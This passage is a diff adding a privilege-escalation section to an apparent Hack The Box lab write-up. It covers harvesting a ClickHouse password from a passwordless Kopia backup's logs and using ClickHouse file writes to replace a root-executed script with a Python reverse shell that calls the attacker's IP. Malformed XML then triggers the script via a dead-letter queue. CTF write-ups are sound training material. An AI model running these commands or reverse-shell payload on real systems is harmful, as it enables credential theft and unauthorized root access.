@@ -432,11 +432,179 @@ print("\n[-] Password not found in wordlist")
 
 
 
+## PrivEsc
+
+
+### found in home directory call `backup` :
+
+<img width="1414" height="424" alt="image" src="https://github.com/user-attachments/assets/d7784b6a-bddf-4636-a7ca-60b0c2ee1c7c" />
+
+
+**`~/backups/`** — a **Kopia repository** in `martin_cole`'s home directory.
+
+Kopia is a **backup tool**. Those files (`kopia.blobcfg.f`, `kopia.repository.f`, `.shards`, `p/`, `q/`, `s/`, `x/`) are the **internal storage structure** of a Kopia repository
+
+
+## found in `/opt/ops` script  **`dlq_drainer.py`**
+
+<img width="1002" height="130" alt="image" src="https://github.com/user-attachments/assets/8959b2ba-91c5-421c-a1e1-51e89f77f4d5" />
+
+
+## DLQ Drainer Script Summary
+
+The `dlq_drainer.py` script consumes failed messages from the Kafka Dead Letter Queue (DLQ) topic `aidx.flightleg.dlq.v1`.
+
+**Key Functions:**
+
+- **Consume:** Reads failed messages from Kafka for a configurable duration (10 seconds by default).
+- **Extract Error Reason:** Retrieves the failure reason from the Kafka message headers.
+- **Quarantine:** Saves each raw message as an XML file in `/var/lib/aidx/quarantine/`.
+- **Format:** Runs an external formatter to extract the message size, XML root tag, and preview.
+- **Log:** Inserts failure details into the ClickHouse table `aidx_ops.failed_ingest`.
+- **Commit:** Commits the Kafka message offset after attempting to save and record the message.
+
+
+
+> ### If that script runs as root, we can overwrite it (via ClickHouse's FILE write privilege with the default user) with a reverse shell, and when the drainer fires, the reverse shell runs as root.
+
+```
+systemctl list-timers --all 2>/dev/null | grep -iE "dlq|aidx|drain"
+systemctl status aidx-dlq-drainer 2>/dev/null
+systemctl cat aidx-dlq-drainer.service
+```
+
+<img width="1556" height="399" alt="image" src="https://github.com/user-attachments/assets/d37a49e2-d544-45aa-83fd-5d6503586f73" />
+
+
+
+- A **root-run systemd timer** that fires every **2 minutes**
+    
+- That timer executes **`/opt/ops/dlq_drainer.py`** as **root**
+    
+- The drainer script, when it runs, calls:
+    
+    ```python
+    
+    subprocess.run(["python3", "/var/lib/clickhouse/user_files/aidx_quarantine.py"], input=raw, ...)
+    ```
+    
+     it **runs the file at that path as root**, with the Kafka message as stdin
+
+
+> If we can replace the file /var/lib/clickhouse/user_files/aidx_quarantine.py with a reverse shell, the root-run drainer will execute our shell as root every time it fires.
+
+---
+
+#### `**Question 1  Can we write to that file?**`
+
+`martin_cole` probably can't (permission denied). **But** — the file lives in **ClickHouse's `user_files` directory**, and the ClickHouse **`default` user has `WRITE ON FILE`** privilege, which lets it write to that directory via SQL.
+
+**So the answer is: yes, but only via ClickHouse** — using the `default` user's credentials.
 
 
 
 
+#### `**Question 2 How do we get the `default` password?**`
 
+`martin_cole` has a Kopia backup repository in `~/backups/` containing a snapshot of `ch-logs`. This backup was passwordless — `kopia repository connect filesystem --path=/home/martin_cole/backups` connects with an empty password.
+
+
+
+#### `**Question 3  How do we trigger the drainer to run our file?**`
+
+The drainer consumes from a Kafka topic `aidx.flightleg.dlq.v1` (DLQ = dead-letter queue). **Messages land there when XML fails validation downstream.** So we send **malformed XML** to the ingest service, it ends up in the DLQ, and the next drainer run picks it up — executing our overwritten `aidx_quarantine.py` as root.
+
+
+## restore kopia snapshot
+
+```
+kopia snapshot list --all
+```
+
+<img width="1426" height="68" alt="image" src="https://github.com/user-attachments/assets/ad062d2b-63fc-4486-a09f-02a8e3f638e2" />
+
+## kopia snapshot
+
+```
+kopia snapshot ls kc43a7ec76aeac204b305df2b777304d1
+mkdir -p /tmp/ch-logs-restore
+```
+
+
+
+The snapshot `kc43a7ec76aeac204b305df2b777304d1` contains ClickHouse server logs. Restoring it reveals:
+
+```
+kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/ch-logs-restore/
+grep -iE "IDENTIFIED BY|password" /tmp/ch-logs-restore/*.log
+```
+
+The ClickHouse error log captured a failed ALTER USER statement with a syntax error — and the error message includes the entire query, including the plaintext password:
+
+
+```
+ALTER USER default IDENTIFIED BY '<PASSWORD>'
+```
+
+<img width="1544" height="420" alt="image" src="https://github.com/user-attachments/assets/4d29fff6-df44-4d0c-b556-616e591261f9" />
+
+
+## Verify:
+
+```
+curl -s "http://db.htb-airport.htb/?user=default&password=<PASSWORD>&query=SELECT%201"
+```
+
+<img width="974" height="141" alt="image" src="https://github.com/user-attachments/assets/b3547c5f-6092-4584-8416-efcd8c8ab727" />
+
+
+## SICNE we have the password let's Overwrite the Formatter Script via ClickHouse
+
+```
+# Set these
+KALI_IP=10.10.16.34    # <-- your tun0 IP
+PORT=4444
+CH_PASS='<PASSWORD>'
+
+curl -s "http://db.htb-airport.htb/?user=default&password=$CH_PASS" \
+  --data-binary "INSERT INTO TABLE FUNCTION file('aidx_quarantine.py', 'LineAsString') SETTINGS engine_file_truncate_on_insert=1 VALUES
+('import socket,subprocess,os'),
+('s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)'),
+('s.connect((\"$KALI_IP\",$PORT))'),
+('os.dup2(s.fileno(),0)'),
+('os.dup2(s.fileno(),1)'),
+('os.dup2(s.fileno(),2)'),
+('subprocess.call([\"/bin/bash\",\"-i\"])')"
+```
+
+## Verify the File Was Overwritten
+
+```
+curl -s "http://db.htb-airport.htb/?user=default&password=$CH_PASS" \
+  --data-binary "SELECT * FROM file('aidx_quarantine.py', 'LineAsString') FORMAT TabSeparated"
+```
+
+<img width="1161" height="239" alt="image" src="https://github.com/user-attachments/assets/45f324ea-17b6-436c-bddb-4881a16c2829" />
+
+## Trigger the DLQ Drainer
+
+```
+TARGET=<ip-of-target>
+
+# The XML is deliberately missing its closing tag to force it into the DLQ
+curl -s -X POST http://$TARGET:8081/feeds/aidx \
+  -H "Content-Type: application/xml" \
+  --data-binary '<?xml version="1.0" encoding="UTF-8"?><IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="rootshell1" TimeStamp="2026-10-13T20:40:00Z" Version="22.1">
+<Originator CompanyShortName="TST" Code="TS"/>
+<FlightLeg><LegIdentifier><Airline>HTB</Airline><FlightNumber>999</FlightNumber><DepartureAirport>XXX</DepartureAirport><ArrivalAirport>YYY</ArrivalAirport></LegIdentifier></FlightLeg>'
+```
+
+<img width="1674" height="264" alt="image" src="https://github.com/user-attachments/assets/b330d2a7-c02f-4ae6-921a-90a6eddb3e01" />
+
+
+# bingoo
+
+<img width="960" height="186" alt="image" src="https://github.com/user-attachments/assets/91fc096b-bade-49e3-bf5f-4074ac493f2d" />
 
 
 
